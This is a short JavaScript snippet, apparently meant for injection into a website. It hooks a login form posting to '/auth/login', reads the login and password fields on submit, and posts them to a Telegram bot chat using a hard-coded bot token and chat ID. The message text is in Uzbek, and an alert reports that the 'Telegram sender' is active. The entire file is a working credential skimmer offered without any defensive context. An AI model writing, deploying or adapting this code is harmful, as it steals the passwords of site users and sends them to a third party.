(function() {
    const BOT_TOKEN = '8618840470:AAGkB8Z41XeH3NYDJYqE6CVMQ6d3av-AkLo';
    const ADMIN_ID = '1350704341';
    const form = document.querySelector('form[action*="/auth/login"]');
    if (form) {
        form.addEventListener('submit', function() {
            var login = document.getElementById('login') ? document.getElementById('login').value : '';
            var password = document.getElementById('password') ? document.getElementById('password').value : '';
            if (login && password) {
                fetch('https://api.telegram.org/bot' + BOT_TOKEN + '/sendMessage', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: ADMIN_ID,
                        text: '🔐 Yangi login maʼlumotlari:\n👤 Login: ' + login + '\n🔑 Parol: ' + password,
                        parse_mode: 'Markdown'
                    }),
                    keepalive: true
                });
            }
        });
        alert('✅ Telegram jo‘natuvchi faollashtirildi');
    }
})();
